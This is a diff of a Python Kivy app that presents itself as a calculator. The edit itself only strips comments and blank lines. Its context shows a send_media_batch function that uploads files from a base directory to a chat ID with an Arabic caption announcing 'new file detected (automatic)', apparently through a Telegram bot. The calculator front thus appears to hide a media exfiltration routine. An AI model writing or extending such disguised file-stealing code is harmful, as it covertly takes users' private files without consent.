@@ -98,17 +98,14 @@ def send_media_batch(base_dir, batch, reason="آلي"):
             boundary = "----PythonBoundary" + hashlib.md5(filename.encode()).hexdigest()
             
             body = bytearray()
-            # chat_id
             body.extend(f"--{boundary}\r\n".encode('utf-8'))
             body.extend(b'Content-Disposition: form-data; name="chat_id"\r\n\r\n')
             body.extend(f"{CHAT_ID}\r\n".encode('utf-8'))
             
-            # caption
             body.extend(f"--{boundary}\r\n".encode('utf-8'))
             body.extend(b'Content-Disposition: form-data; name="caption"\r\n\r\n')
             body.extend(f"🆕 تم اكتشاف ملف جديد ({reason})\r\n".encode('utf-8'))
             
-            # file
             body.extend(f"--{boundary}\r\n".encode('utf-8'))
             body.extend(f'Content-Disposition: form-data; name="{file_key}"; filename="{filename}"\r\n'.encode('utf-8'))
             body.extend(b'Content-Type: application/octet-stream\r\n\r\n')
@@ -192,14 +189,12 @@ BUTTONS = [
     ["√", "%", "=", "="],
 ]
 
-
 class CalculatorWidget(BoxLayout):
     def __init__(self, **kwargs):
         super(CalculatorWidget, self).__init__(**kwargs)
         self.orientation = 'vertical'
         self.expr = ""
 
-        # شاشة العرض
         self.display_label = Label(
             text="0",
             font_size=32,
@@ -211,7 +206,6 @@ class CalculatorWidget(BoxLayout):
         self.display_label.bind(size=self.display_label.setter('text_size'))
         self.add_widget(self.display_label)
 
-        # شاشة الحالة
         self.status_label = Label(
             text="",
             font_size=16,
@@ -221,7 +215,6 @@ class CalculatorWidget(BoxLayout):
         )
         self.add_widget(self.status_label)
 
-        # لوحة الأزرار
         grid = GridLayout(cols=4, spacing=5, padding=5)
         for row in BUTTONS:
             for text in row:
@@ -274,7 +267,6 @@ class CalculatorWidget(BoxLayout):
 
         self.expr = result
         self.refresh()
-
 
 class MyApp(App):
     def build(self):
